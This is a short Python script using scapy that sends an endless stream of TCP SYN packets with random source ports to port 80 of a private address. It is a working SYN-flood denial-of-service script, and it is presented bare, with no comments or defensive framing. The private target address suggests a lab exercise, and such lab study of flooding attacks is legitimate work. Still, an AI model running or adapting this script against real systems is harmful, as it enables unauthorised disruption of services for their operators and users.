from scapy.all import *
p=IP(dst='192.168.128.132')/TCP(flags="S",  sport=RandShort(),  dport=int(80))
send(p,  verbose=0, loop=1)
